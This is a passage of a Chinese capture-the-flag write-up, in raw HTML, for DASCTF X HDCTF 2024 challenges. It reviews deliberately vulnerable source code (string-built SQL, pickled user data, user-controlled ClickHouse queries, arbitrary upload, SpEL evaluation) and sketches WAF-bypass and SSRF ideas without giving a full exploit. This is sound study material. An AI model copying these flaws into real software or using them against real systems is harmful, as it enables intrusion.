string">"place"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"date"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        wish <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'insert into wishes(`id`, `wish`) values (&#123;id&#125;, "&#123;wish&#125;")'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token operator">=</span>wish<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的data会以pickle字符串传入到数据库中</p><p>但是这里有一个问题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>add_routes<span class="token punctuation">(</span><span class="token punctuation">[</span>web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/waf'</span><span class="token punctuation">,</span> waf<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/addWishes'</span><span class="token punctuation">,</span> addWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/getWishes'</span><span class="token punctuation">,</span> getWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/rmWishes'</span><span class="token punctuation">,</span> rmWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们访问&#x2F;addWishes的时候会触发waf</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602112659615.png" alt="image-20240602112659615"></p><p>猜测得从aiohttp自身的漏洞出发思考绕过方式</p><p>稍微搜一下发现 aiohttp(yarl) 会对 url 部分字符自动 urldecode：<a href="https://blog.csdn.net/qq_31720329/article/details/82024036">https://blog.csdn.net/qq_31720329/article/details/82024036</a></p><p>本地测试也发现会自动urldecode</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602162110539.png" alt="image-20240602162110539"></p><p>但是进不去&#x2F;addWishes路由。。可以发现它进入路由是在urldecode之前，然后path的值为urldecode之后</p><hr><h2 id="RceHouse-Unsolved"><a href="#RceHouse-Unsolved" class="headerlink" title="RceHouse (Unsolved)"></a>RceHouse (Unsolved)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> clickhouse_connect<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>client <span class="token operator">=</span> clickhouse_connect<span class="token punctuation">.</span>get_client<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8123</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">'default'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/status"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>        remote_addr <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        <span class="token keyword">print</span><span class="token punctuation">(</span>remote_addr<span class="token punctuation">)</span>        <span class="token keyword">if</span> remote_addr<span class="token operator">==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>            command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"clickhouse-client"</span><span class="token punctuation">,</span> <span class="token string">"--query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'param'</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try harder'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try better'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#此处是clickhouse的查询语法，不存在注入问题</span>        sql <span class="token operator">=</span> <span class="token string">'SELECT * FROM ctf.users WHERE id = '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        res<span class="token operator">=</span>client<span class="token punctuation">.</span>command<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"Boogipop"</span>    file_path <span class="token operator">=</span><span class="token string">"/tmp/"</span><span class="token operator">+</span>filename    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> file_path<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审一下代码，总共就三个路由</p><p>&#x2F;status路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/status"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>        remote_addr <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        <span class="token keyword">print</span><span class="token punctuation">(</span>remote_addr<span class="token punctuation">)</span>        <span class="token keyword">if</span> remote_addr<span class="token operator">==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>            command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"clickhouse-client"</span><span class="token punctuation">,</span> <span class="token string">"--query"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'param'</span><span class="token punctuation">)</span> <span class="token punctuation">]</span>            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try harder'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"clickhouse-client --query=\"select 'try better'\""</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼打ssrf然后命令执行</p><p>&#x2F;sql路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/sql"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#此处是clickhouse的查询语法，不存在注入问题</span>        sql <span class="token operator">=</span> <span class="token string">'SELECT * FROM ctf.users WHERE id = '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        res<span class="token operator">=</span>client<span class="token punctuation">.</span>command<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> e<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行sql查询</p><p><img src="/blog/2024/06/02/DASCTF-X-HDCTF-2024/image-20240602121309967.png" alt="image-20240602121309967"></p><p>&#x2F;upload路由：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"Boogipop"</span>    file_path <span class="token operator">=</span><span class="token string">"/tmp/"</span><span class="token operator">+</span>filename    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> file_path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个任意文件上传的功能，上传的文件路径为<code>/tmp/Boogipop</code></p><hr><h2 id="ImpossibleUnser-Unsolved"><a href="#ImpossibleUnser-Unsolved" class="headerlink" title="ImpossibleUnser (Unsolved)"></a>ImpossibleUnser (Unsolved)</h2><p>先审代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpServer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetSocketAddress</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServer</span> server <span class="token operator">=</span> <span class="token class-name">HttpServer</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/ctf"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SPELHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/unser"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">UnserHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Executor</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        server<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/ctf</code>路由：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpExchange</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span><span class="token class-name">HttpHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLDecoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SPELHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SPELHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">HttpExchange</span> httpExchange<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InputStream</span> requestBody <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">readInputStream</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>body<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token class-name">PostData</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseFormData</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token class-name">PostData</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            payload <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">MySecurityWaf</span> mySecurityWaf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySecurityWaf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mySecurityWaf<span class="token punctuation">.</span><span class="token function">securitycheck</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> value <span class="token operator">=</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">"Welcome to My Challenge"</span><span class="token punctuation">;</span>                httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> response <span class="token operator">=</span> <span class="token string">"Give me some payload Plz inject me"</span><span class="token punctuation">;</span>        httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 